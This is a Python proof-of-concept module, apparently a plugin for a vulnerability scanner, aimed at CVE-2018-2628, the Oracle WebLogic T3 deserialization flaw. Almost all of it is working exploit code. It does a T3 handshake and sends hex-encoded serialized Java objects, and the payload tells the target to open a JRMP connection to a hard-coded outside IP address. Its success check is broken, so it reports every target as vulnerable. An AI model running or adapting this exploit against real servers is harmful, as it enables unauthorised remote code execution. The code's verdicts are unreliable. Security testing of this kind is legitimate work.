# coding : utf-8
# @Time : 2022/10/25 11:18
# @Author : hqe
# @File : v_2022_0008_WLS_DESERIALIZE.py
# @Project : GEngine
import socket, time, re
from BasePoc import BasePoc


POC_NAME="WeblogicSerialize"

class WeblogicSerialize(BasePoc):

    poc_info = {
            'Id': 'v_2022_0008',
            'Name': 'Oracle Fusion Middleware 代码问题漏洞',
            'Author': 'hqe',
            'Create_date': '2022-10-18',
    }

    vul_info = {
        'Product': 'Oracle',
        'Version': 'Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3。',
        'Type': '反序列化',
        'Level': 3,
        'CVE': 'CVE-2018-2628',
        'CNNVD': 'CNNVD-201804-803',
        'CNVD': 'CNVD-2018-07811',
        'Description': """
                            Oracle WebLogic server是一款应用服务器平台，用于构建和运行企业应用和服务。
                            Oracle WebLogic Server WLS核心组件存在反序列化漏洞，远程攻击者可利用漏洞在未授权的情况下远程执行代码。
                       """,
        'DisclosureDate': '2018-04-18',
    }

    def verify(self,  *args, **kwargs):

        # payload_str = 'aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707736000a556e6963617374526566000d34372e39342e3135382e31323500005911ffffffffe0279a3900000000000000000000000000000078'
        payload_str = 'aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000001292820000000000000010000011caced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707736000a556e6963617374526566000d34372e39342e3135382e31323500005911ffffffffea9ca7350000000000000000000000000000007878'
        result_check_str = '\\$Proxy[0-9]+'
        wlserver_addr = (self.scan_info['Target'], 7001)
        mysock = None
        try:
            mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # 设置Soocket的超时时间.
            mysock.settimeout(30)
            # 设置端口复用, 减少大量连接时端口的占用.
            # mysock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            mysock.connect(wlserver_addr)
            # 发送t3(协议)连接的头数据, 是后面发送Java序列化数据包的基础.
            self.t3Handshake(mysock)
            self.buildT3RequestObject(mysock, 7001)
            evil_return_data = self.sendEvilObjData(mysock, payload_str)
            self.checkVulResult(evil_return_data, result_check_str)
        except socket.error as e:
            print('Socket error occured : ' + str(e))
        finally:
            if mysock != None:
                mysock.close()


    def t3Handshake(self,p_sock):
        p_sock.send(bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
        time.sleep(2)
        response_data = repr(p_sock.recv(1024))
        if response_data.find('HELO') != -1:
            response_str = response_data[response_data.index(':') + 1 : response_data.index('\\n')]
            target_wls_version = response_str[0 : response_str.rindex('.')]
            print('Target WebLogic Version : ' + target_wls_version)
            print('Handshake weblogic through t3 protocol successfully!')
        else:
            print('Handshake weblogic through t3 protocol failed!')
            exit(1)


    def buildT3RequestObject(self,p_sock, port):
        data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
        data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(port))
        data3 = '1a7727000d3234322e323134'
        data4 = '2e312e32353461863d1d0000000078'
        for d in [data1, data2, data3, data4]:
            p_sock.send(bytes.fromhex(d))
        time.sleep(2)
        p_sock.recv(2048)


    def sendEvilObjData(self,p_sock, main_data):
        payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
        payload += main_data
        payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
        payload = '%s%s' % ('{:08x}'.format(int(len(payload) / 2) + 4), payload)
        p_sock.send(bytes.fromhex(payload))
        time.sleep(3)
        response_data = ''
        p_sock.setblocking(0)
        try:
            while True:
                response_data += p_sock.recv(4096).decode("utf-8", "ignore")
                if not response_data:
                    break
        except socket.error:
            pass
        return response_data


    def checkVulResult(self, response_data, result_check_str):
        print(response_data)
        result_matched_str = re.findall(result_check_str, response_data, re.S)
        if not result_matched_str is None:
            self.scan_info['Success']=True

